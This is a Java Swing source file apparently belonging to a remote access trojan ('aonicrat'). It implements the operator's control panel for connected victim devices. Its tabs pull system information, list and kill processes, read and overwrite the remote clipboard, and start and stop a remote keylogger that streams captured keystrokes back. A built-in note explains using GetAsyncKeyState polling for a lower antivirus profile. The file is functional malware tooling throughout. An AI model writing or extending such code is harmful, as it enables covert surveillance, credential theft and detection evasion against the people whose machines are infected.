package com.webaon.aonicrat;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.util.List;

public class OthersPanel extends JPanel {

    // ── device selector ───────────────────────────────────────────────────────
    private final JComboBox<String> osCombo     = new JComboBox<>(new String[]{"Windows","Mac OS","Linux","Android","iOS"});
    private final JComboBox<String> deviceCombo = new JComboBox<>();
    private final JButton loadBtn       = new JButton("Load More Devices");
    private final JButton connectBtn    = new JButton("Connect");
    private final JButton disconnectBtn = new JButton("Disconnect");
    private final JLabel  statusLabel   = new JLabel("  Not connected");

    // ── system info ───────────────────────────────────────────────────────────
    private final DefaultTableModel sysModel = new DefaultTableModel(
        new String[]{"Property","Value"}, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };
    private final JTable  sysTable  = new JTable(sysModel);
    private final JButton sysGetBtn = new JButton("Get Info");

    // ── process manager ───────────────────────────────────────────────────────
    private final DefaultTableModel procModel = new DefaultTableModel(
        new String[]{"PID","Name","Memory"}, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };
    private final JTable  procTable   = new JTable(procModel);
    private final JButton procRefresh = new JButton("Refresh");
    private final JButton procKill    = new JButton("Kill Process");

    // ── clipboard ─────────────────────────────────────────────────────────────
    private final JTextArea clipArea   = new JTextArea(6, 40);
    private final JButton clipGetBtn   = new JButton("Get Clipboard");
    private final JButton clipSetBtn   = new JButton("Set Clipboard");

    // ── keylogger ─────────────────────────────────────────────────────────────
    private final JTextArea keylogArea = new JTextArea(10, 50);
    private final JButton keyStartBtn  = new JButton("▶ Start");
    private final JButton keyStopBtn   = new JButton("■ Stop");
    private final JButton keyClearBtn  = new JButton("Clear");
    private final JLabel  keyStatus    = new JLabel("  Idle");

    // ── state ─────────────────────────────────────────────────────────────────
    private final ServerManager serverManager;
    private RemoteDevice currentDevice;
    private String keylogSessionId;

    public OthersPanel(ServerManager sm) {
        this.serverManager = sm;
        setLayout(new BorderLayout());
        add(buildTopBar(),    BorderLayout.NORTH);
        add(buildTabs(),      BorderLayout.CENTER);
        add(buildStatusBar(), BorderLayout.SOUTH);
        setupListener();
        wireButtons();
    }

    // ─────────────────────────────────────────────────────────────────────────

    private JPanel buildTopBar() {
        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 5));
        bar.setBackground(new Color(102, 204, 255));
        bar.add(new JLabel("OS Type:")); bar.add(osCombo);
        bar.add(new JLabel("Device:"));
        deviceCombo.setPreferredSize(new Dimension(220, 22));
        bar.add(deviceCombo);
        bar.add(loadBtn); bar.add(connectBtn); bar.add(disconnectBtn);
        return bar;
    }

    private JPanel buildStatusBar() {
        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 3));
        bar.setBackground(new Color(230, 230, 230));
        bar.add(new JLabel("Status:")); bar.add(statusLabel);
        return bar;
    }

    private JTabbedPane buildTabs() {
        JTabbedPane t = new JTabbedPane();
        t.addTab("System Info",      buildSysTab());
        t.addTab("Process Manager",  buildProcTab());
        t.addTab("Clipboard",        buildClipTab());
        t.addTab("Keylogger",        buildKeylogTab());
        return t;
    }

    private JPanel buildSysTab() {
        JPanel p = new JPanel(new BorderLayout(0, 4));
        p.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));
        JPanel tb = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        tb.add(sysGetBtn);
        p.add(tb, BorderLayout.NORTH);
        sysTable.setFont(new Font("Consolas", Font.PLAIN, 12));
        sysTable.setRowHeight(20);
        sysTable.getColumnModel().getColumn(0).setPreferredWidth(180);
        sysTable.getColumnModel().getColumn(1).setPreferredWidth(580);
        p.add(new JScrollPane(sysTable), BorderLayout.CENTER);
        return p;
    }

    private JPanel buildProcTab() {
        JPanel p = new JPanel(new BorderLayout(0, 4));
        p.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));
        JPanel tb = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        tb.add(procRefresh); tb.add(procKill);
        p.add(tb, BorderLayout.NORTH);
        procTable.setFont(new Font("Consolas", Font.PLAIN, 12));
        procTable.setRowHeight(20);
        procTable.getColumnModel().getColumn(0).setPreferredWidth(80);
        procTable.getColumnModel().getColumn(1).setPreferredWidth(300);
        procTable.getColumnModel().getColumn(2).setPreferredWidth(120);
        p.add(new JScrollPane(procTable), BorderLayout.CENTER);
        return p;
    }

    private JPanel buildClipTab() {
        JPanel p = new JPanel(new BorderLayout(0, 4));
        p.setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));
        JPanel tb = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        tb.add(clipGetBtn); tb.add(clipSetBtn);
        p.add(tb, BorderLayout.NORTH);
        clipArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        clipArea.setLineWrap(true); clipArea.setWrapStyleWord(true);
        p.add(new JScrollPane(clipArea), BorderLayout.CENTER);
        JLabel note = new JLabel("<html><small><b>Get</b> reads remote clipboard. <b>Set</b> pushes the text above to it.</small></html>");
        note.setBorder(BorderFactory.createEmptyBorder(2, 4, 2, 4));
        p.add(note, BorderLayout.SOUTH);
        return p;
    }

    private JPanel buildKeylogTab() {
        JPanel p = new JPanel(new BorderLayout(0, 4));
        p.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));
        JPanel tb = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        keyStopBtn.setEnabled(false);
        tb.add(keyStartBtn); tb.add(keyStopBtn); tb.add(keyClearBtn); tb.add(keyStatus);
        p.add(tb, BorderLayout.NORTH);
        keylogArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        keylogArea.setLineWrap(true); keylogArea.setWrapStyleWord(true);
        keylogArea.setEditable(false);
        p.add(new JScrollPane(keylogArea), BorderLayout.CENTER);
        JLabel note = new JLabel("<html><small>"
            + "Windows: polling via GetAsyncKeyState (no SetWindowsHookEx — lower AV profile). "
            + "Linux: reads /dev/input/event* (requires root). "
            + "Mac: not yet supported."
            + "</small></html>");
        note.setBorder(BorderFactory.createEmptyBorder(2, 4, 2, 4));
        p.add(note, BorderLayout.SOUTH);
        return p;
    }

    // ─────────────────────────────────────────────────────────────────────────

    private void setupListener() {
        serverManager.setOthersListener(new ServerManager.OthersListener() {
            @Override public void onSysInfo(RemoteDevice d, String[][] rows) {
                sysModel.setRowCount(0);
                for (String[] r : rows) sysModel.addRow(r);
                statusLabel.setText("  System info from " + d.pcName);
            }
            @Override public void onProcessList(RemoteDevice d, String[][] rows) {
                procModel.setRowCount(0);
                for (String[] r : rows) procModel.addRow(r);
                statusLabel.setText("  " + rows.length + " processes on " + d.pcName);
            }
            @Override public void onProcessKilled(RemoteDevice d, String pid, boolean ok, String err) {
                if (ok) {
                    statusLabel.setText("  Process " + pid + " killed");
                    serverManager.sendOthersCmd(d, "proc:list", null);
                } else {
                    JOptionPane.showMessageDialog(OthersPanel.this, "Kill failed: " + err, "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
            @Override public void onClipboardData(RemoteDevice d, String text) {
                clipArea.setText(text);
                statusLabel.setText("  Clipboard read from " + d.pcName);
            }
            @Override public void onClipboardSet(RemoteDevice d, boolean ok, String err) {
                statusLabel.setText(ok ? "  Clipboard set on " + d.pcName : "  Set failed: " + err);
            }
            @Override public void onKeylogStarted(RemoteDevice d, String sid) {
                keyStatus.setText("  Logging…");
                keyStartBtn.setEnabled(false); keyStopBtn.setEnabled(true);
                statusLabel.setText("  Keylogger active on " + d.pcName);
            }
            @Override public void onKeylogData(RemoteDevice d, String data) {
                keylogArea.append(data);
                keylogArea.setCaretPosition(keylogArea.getDocument().getLength());
            }
            @Override public void onKeylogStopped(RemoteDevice d, String sid) {
                keyStatus.setText("  Stopped");
                keyStartBtn.setEnabled(true); keyStopBtn.setEnabled(false);
                statusLabel.setText("  Keylogger stopped on " + d.pcName);
                keylogSessionId = null;
            }
            @Override public void onError(RemoteDevice d, String op, String err) {
                if ("keylog".equals(op) || op.startsWith("key")) {
                    keyStatus.setText("  Error");
                    keyStartBtn.setEnabled(true); keyStopBtn.setEnabled(false);
                    keylogSessionId = null;
                }
                JOptionPane.showMessageDialog(OthersPanel.this,
                    "[" + op + "] " + err, "Error", JOptionPane.ERROR_MESSAGE);
                statusLabel.setText("  Error: " + err);
            }
        });
    }

    private void wireButtons() {
        loadBtn.addActionListener(e -> {
            String os = (String) osCombo.getSelectedItem();
            List<RemoteDevice> devs = serverManager.getDevicesByOsType(os);
            DefaultComboBoxModel<String> m = new DefaultComboBoxModel<>();
            for (RemoteDevice d : devs) m.addElement(d.toString());
            deviceCombo.setModel(m);
        });

        connectBtn.addActionListener(e -> {
            String sel = (String) deviceCombo.getSelectedItem();
            if (sel == null || sel.isEmpty()) { JOptionPane.showMessageDialog(this, "Load devices first."); return; }
            currentDevice = serverManager.getConnectedDevices().stream()
                .filter(d -> d.toString().equals(sel)).findFirst().orElse(null);
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Device not found."); return; }
            statusLabel.setText("  Connected to " + currentDevice.pcName);
        });

        disconnectBtn.addActionListener(e -> {
            if (currentDevice != null && keylogSessionId != null) {
                org.json.JSONObject p = new org.json.JSONObject();
                p.put("sessionId", keylogSessionId);
                serverManager.sendOthersCmd(currentDevice, "key:stop", p);
            }
            currentDevice = null; keylogSessionId = null;
            keyStatus.setText("  Idle");
            keyStartBtn.setEnabled(true); keyStopBtn.setEnabled(false);
            statusLabel.setText("  Not connected");
        });

        sysGetBtn.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            serverManager.sendOthersCmd(currentDevice, "sys:info", null);
        });

        procRefresh.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            serverManager.sendOthersCmd(currentDevice, "proc:list", null);
        });

        procKill.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            int row = procTable.getSelectedRow();
            if (row < 0) { JOptionPane.showMessageDialog(this, "Select a process first."); return; }
            String pid  = procTable.getValueAt(row, 0).toString();
            String name = procTable.getValueAt(row, 1).toString();
            if (JOptionPane.showConfirmDialog(this, "Kill " + name + " (PID " + pid + ")?",
                    "Confirm", JOptionPane.YES_NO_OPTION) == JOptionPane.YES_OPTION) {
                org.json.JSONObject p = new org.json.JSONObject();
                p.put("pid", pid);
                serverManager.sendOthersCmd(currentDevice, "proc:kill", p);
            }
        });

        clipGetBtn.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            serverManager.sendOthersCmd(currentDevice, "clip:get", null);
        });

        clipSetBtn.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            org.json.JSONObject p = new org.json.JSONObject();
            p.put("text", clipArea.getText());
            serverManager.sendOthersCmd(currentDevice, "clip:set", p);
        });

        keyStartBtn.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            keylogSessionId = java.util.UUID.randomUUID().toString();
            org.json.JSONObject p = new org.json.JSONObject();
            p.put("sessionId", keylogSessionId);
            keyStatus.setText("  Starting…");
            keyStartBtn.setEnabled(false);
            serverManager.sendOthersCmd(currentDevice, "key:start", p);
        });

        keyStopBtn.addActionListener(e -> {
            if (currentDevice != null && keylogSessionId != null) {
                org.json.JSONObject p = new org.json.JSONObject();
                p.put("sessionId", keylogSessionId);
                serverManager.sendOthersCmd(currentDevice, "key:stop", p);
            }
        });

        keyClearBtn.addActionListener(e -> keylogArea.setText(""));
    }
}
